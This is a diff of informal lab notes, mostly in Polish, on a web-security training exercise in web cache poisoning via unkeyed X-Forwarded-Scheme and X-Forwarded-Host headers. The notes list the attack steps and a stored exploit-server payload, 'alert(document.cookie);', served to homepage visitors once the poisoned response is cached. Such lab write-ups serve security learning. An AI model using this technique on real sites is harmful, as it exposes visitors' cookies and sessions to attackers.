@@ -215,31 +215,21 @@ fehost
 notes:
 X-Forwarded-Scheme is an HTTP request header used to identify the original protocol (HTTP or HTTPS) a client used to connect to a proxy or load balancer.
 
-1.test cache miss hit 
+Long story short:
+Aplikacvja ma dwa ukryte nagłówki. Drugi wyszukujemy dopiero jak wprowadzimy do żądania pierwszy wykryty.
+Nagłówek X-Forwarded-Scheme jeśli ma wartość inną niż https, powoduje redirect do tracking cooki, zaciągając do Location host z X-Forwarded-Host.
+Będąc w GET /resources wprowadzamy X-Forwarded-Scheme:http i X-Forwarded-Host: exploit server.
+W explot server poprawnie uzupełniamy file i body. Store.
+Cachujemy ww. GET póki nie będzie hit.
+Odświeżamy stronę główną. Vuala.
 
-<br>
 
-2.add CacheBuster in GET (not impact users using homepage) 
+test cache miss hit 
 
-<br>
+param miner 1st > insert new header
+param miner 2nd
 
-3. Miss > Skan param miner > guess header : x-forwarded-scheme: 
-Scheme to start url i mowi, czy to będzie http czy ftp czy https
-x-forwarded-scheme: nohttps
-
-bo nohttps dają 302, a https 200.
-tip: żeby testować czy xfs się cachuje, musimy alterowac GET (xfs jest unkeyed) 
-
-<br>
-
-4.Second skan: x-forwarded-scheme: nohttps> Miss>Skan param miner > guess header : x-forwarded-scheme: 
-Znaleziony drugi nagłówek
-
-<img width="764" height="523" alt="image" src="https://github.com/user-attachments/assets/f6ebc9c3-6710-422c-a28b-6af8c45a9a60" />
-
-<br>
-
-5. new /?cb=6
+new /?cb=6
 X-Forwarded-Host: exploit-0a11008604ffa19d80ac4d970137004d.exploit-server.net
 body exploit server:
 alert(document.cookie);
@@ -248,7 +238,7 @@ browsre lab/?cb=6
 
 <br>
 
-6. GET change to /resources path
+GET change to /resources path
 
 <hr>
 <img width="1201" height="484" alt="image" src="https://github.com/user-attachments/assets/93669f29-caed-4193-868a-fd56bd9295ea" />
@@ -275,7 +265,7 @@ browsre lab/?cb=6
 
 
 
-<h2>Lab: Targeted web cache poisoning using an unknown header<h2>
+<h2>Lab: Targeted web cache poisoning using an unknown header</h2>h2>
 
 1. GET /cb=1
 resp: miss
